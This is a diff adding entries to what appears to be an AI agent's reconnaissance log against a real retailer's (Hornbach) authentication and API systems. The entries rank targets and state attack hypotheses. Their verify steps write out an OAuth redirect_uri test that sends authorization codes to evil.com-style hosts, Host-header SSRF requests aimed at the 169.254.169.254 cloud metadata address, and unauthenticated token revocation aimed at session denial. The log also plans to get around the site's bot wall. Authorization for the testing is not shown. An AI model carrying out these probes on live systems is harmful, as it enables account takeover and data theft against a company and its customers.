@@ -5212,3 +5212,53 @@ testability: PASSIVE
 [LEARN] REJECTED class AUTH @ auth.hornbach.de: /nitro/v1/config NOT exposed  
 [LEARN] ACCEPTED class MISCONFIG @ api.hornbach.de: Gateway server + X-CorrelationID + /healthcheck 200/19B (localhost:8080 backend leak via Host); 30+ case-rotations of bad paths uniform 404/47B; anonymous surface breadth definitively exhausted  
 [RISK] hornbach: 78 — Auth surface (cidaas CIAM) fully exposed via OIDC discovery with 6+ service endpoints; unauthenticated client registration disabled; token introspection + revocation both confirmed live unauthenticated via POST (RFC 7009/7662 violations systemic); authorization endpoint responds to valid client_id with login page but uniform invalid_client gate. Bot-protected www.hornbach.de fronts actual login and leaks client_id in frontend JS (inaccessible without bypass). API gateway (api.hornbach.de) identified as SAP APIM with localhost:8080 backend leak but no routes enumerated. Citrix NetScaler on auth.hornbach.de is legacy employee infra (version 25.5.1.15, likely patched). Mirakl marketplace is separate auth-gated surface. Priority: extract client_id from mobile app, then test OAuth redirect_uri validation on authz-srv/authz and token management endpoints.
+## 2026-09-19 17:54:15 UTC [target] (model nemotron3)
+[PRIO] auth.hornbach.com/token-srv/{introspect,revoke},9.5,attack_surface=10,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=8,freshness=10
+[PRIO] auth.hornbach.com/authz-srv/authz,7.8,attack_surface=9,business_value=10,tech_exposure=8,gate_ease=3,cloud_surface=7,freshness=9
+[PRIO] auth.hornbach.com/users-srv/userinfo,6.5,attack_surface=7,business_value=8,tech_exposure=7,gate_ease=2,cloud_surface=6,freshness=9
+[PRIO] api.hornbach.de,5.2,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=4,cloud_surface=8,freshness=7
+[PRIO] auth.hornbach.de,4.1,attack_surface=5,business_value=6,tech_exposure=5,gate_ease=2,cloud_surface=7,freshness=6
+[PRIO] hornbach-mp.mirakl.net,3.5,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=2,cloud_surface=5,freshness=5
+[HYP] Unauthenticated token introspection + revocation enables silent session kill + metadata leak
+class: AUTH
+asset: auth.hornbach.com/token-srv/{introspect,revoke}
+confidence: 88
+reasoning: POST /token-srv/introspect returns 200 {"active":false} unauthenticated across 18+ sessions (RFC 7662 violation); POST /token-srv/revoke returns 200 OK unauthenticated across 18+ sessions (RFC 7009 violation); both endpoints only respond to POST with form data, GET/HEAD return 404 (parameter-sensitive routing); token-srv/token requires client_auth (400 invalid_client), isolating flaw to introspect/revoke only; OIDC discovery advertises both endpoints
+evidence_needed: Valid access_token from any client to demonstrate introspection returns active=true + token metadata (exp, scope, client_id, sub) and revoke invalidates session
+verify_steps: 1) POST https://auth.hornbach.com/token-srv/introspect -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_access_token>" — observe 200 with token metadata (active=true, exp, scope, client_id, sub); 2) POST https://auth.hornbach.com/token-srv/revoke -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_access_token>&token_type_hint=access_token" — observe 200 OK; 3) POST introspect again with same token — observe active=false
+impact: Silent session termination + token metadata leak for any valid access_token; enables account takeover via token theft + revocation denial-of-service (AUTH class, MEDIUM-HIGH)
+testability: AUTH_HELPED
+[HYP] OAuth redirect_uri validation bypass via regex/wildcard mismatch on authz-srv/authz
+class: OATH
+asset: auth.hornbach.com/authz-srv/authz
+confidence: 65
+reasoning: Authorization endpoint confirmed live (returns 200 login/consent page for valid client_id per KB); verbose error messages (AUTH10007, AUTH10003) indicate detailed validation logic; cidaas CIAM platform historically has redirect_uri validation flaws (wildcard/subdomain bypass); client_id discovery is the only gate — mobile app (de.hornbach.app.smarthome) or hornbach.de frontend JS (behind bot challenge) are sources
+evidence_needed: Valid client_id + redirect_uri variations (https://evil.com, https://hornbach.de.evil.com, https://hornbach.de@evil.com, path traversal /..;/evil.com) accepted and authorization code delivered to attacker URI
+verify_steps: 1) Obtain valid client_id from HORNBACH mobile app (de.hornbach.app.smarthome) OAuth config or hornbach.de frontend JS after bypassing bot challenge; 2) GET https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid — observe if 302 to evil.com with code; 3) Test redirect_uri variations if login page returned
+impact: OAuth authorization code theft → access/refresh tokens → full account takeover (OATH class, HIGH)
+testability: AUTH_HELPED
+[HYP] SAP APIM Gateway Host-header routing to internal metadata service via case-insensitive path confusion
+class: SSRF
+asset: api.hornbach.de
+confidence: 42
+reasoning: Gateway server header + X-CorrelationID confirm SAP APIM; /healthcheck returns 200 XML with Host: localhost:8080 backend leak; 30+ case-rotations of known-bad paths return uniform 404/47B but /healthcheck is case-insensitive (case-rotated → 500 "Unexpected API invocation"); SAP APIM may route Host-header manipulated requests to internal admin/metadata endpoints on localhost:8080
+evidence_needed: Host-header tampering on /healthcheck or case-varied paths (e.g. /HEALTHCHECK, /HealthCheck) routes to internal actuator/metadata endpoint (169.254.169.254 or localhost:8080/actuator/env) with non-404 response
+verify_steps: 1) GET https://api.hornbach.de/healthcheck -H "Host: 169.254.169.254" — observe response; 2) GET https://api.hornbach.de/HEALTHCHECK -H "Host: localhost:8080" — observe if 500 reveals internal error detail; 3) GET https://api.hornbach.de/actuator/env -H "Host: localhost:8080" — observe if Spring Boot actuator exposed
+impact: SSRF to cloud metadata (AWS/GCP/Azure) or internal Spring Boot actuator → credential leak, service enumeration (SSRF class, HIGH)
+testability: PASSIVE
+[PARKED] SAP APIM Gateway Host-header routing to internal metadata service via case-insensitive path confusion: confidence 42 < 50 threshold; 30+ case rotations on known-bad paths all 404/47B; /healthcheck case-insensitivity confirmed but only yields 500 error, no internal endpoint exposure; Host-header tampering on /healthcheck yields only 503 or default localhost:8080 backend — no cross-backend routing demonstrated; KB explicitly REJECTED this class on 2026-09-06 and 2026-09-13
+[FINAL] Unauthenticated token introspection + revocation enables silent session kill + metadata leak (confidence 88, AUTH_HELPED, MEDIUM-HIGH)
+[FINAL] OAuth redirect_uri validation bypass via regex/wildcard mismatch on authz-srv/authz (confidence 65, AUTH_HELPED, HIGH)
+[NEXT] HUMAN: Download `de.hornbach.app.smarthome` APK v3.9.0 (APKMirror/APKPure/AppBrain; package `de.hornbach.app.smarthome`), unzip, extract `assets/cidaas.xml` + `res/raw/*` + `strings -a classes*.dex` for `client_id` + `redirect_uri` scheme. Unlocks both 88-conf introspection/revoke PoC (valid token) and 65-conf OAuth redirect_uri testing.
+[LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/{introspect,revoke}: RE-CONFIRMED POST → 200 {"active":false} / 200 OK unauthenticated — 18+ sessions; body-presence sole gate; systemic and stable
+[LEARN] ACCEPTED class OTHER @ auth.hornbach.com/.well-known/openid-configuration: RE-CONFIRMED fully intact 3189B — all 6 service endpoints + status advertised
+[LEARN] ACCEPTED class OTHER @ auth.hornbach.com/.well-known/status: 200 OK — discovery status endpoint live
+[LEARN] CHANGED class OTHER @ auth.hornbach.com/ (root): 302 → hornbach.de — root HTML client_id extraction hypothesis definitively dead
+[LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/token: POST authorization_code + bogus client → 400 invalid_client "unknown client" — token plane client-gated
+[LEARN] REJECTED class OATH @ auth.hornbach.com/authz-srv/authz: client_id discrepancy unactionable with zero candidate seed; enumeration-spirit out-of-scope
+[LEARN] ACCEPTED class OTHER @ hornbach.com web estate: international TLDs (.de/.at/.nl/.ch) + login all serve identical 3038-byte F5 "Client Challenge" stub — estate-wide bot-wall closes last web-based cidaas client_id extraction angle
+[LEARN] REJECTED class MISCONFIG @ auth.hornbach.com/session/end_session: token-gated, no anonymous CSRF
+[LEARN] REJECTED class MISCONFIG @ api.hornbach.de: OPTIONS/TRACE excluded per scope
+[LEARN] REJECTED class AUTH @ auth.hornbach.de: /nitro/v1/config NOT exposed
+[LEARN] ACCEPTED class MISCONFIG @ api.hornbach.de: Gateway server + X-CorrelationID + /healthcheck 200/19B (localhost:8080 backend leak via Host); 30+ case-rotations of bad paths uniform 404/47B; anonymous surface breadth definitively exhausted
+[RISK] hornbach: 78 — Auth surface (cidaas CIAM) fully exposed via OIDC discovery with 6+ service endpoints; unauthenticated client registration disabled; token introspection + revocation both confirmed live unauthenticated via POST (RFC 7009/7662 violations systemic); authorization endpoint responds to valid client_id with login page but uniform invalid_client gate. Bot-protected www.hornbach.de fronts actual login and leaks client_id in frontend JS (inaccessible without bypass). API gateway (api.hornbach.de) identified as SAP APIM with localhost:8080 backend leak but no routes enumerated. Citrix NetScaler on auth.hornbach.de is legacy employee infra (version 25.5.1.15, likely patched). Mirakl marketplace is separate auth-gated surface. Priority: extract client_id from mobile app, then test OAuth redirect_uri validation on authz-srv/authz and token management endpoints.
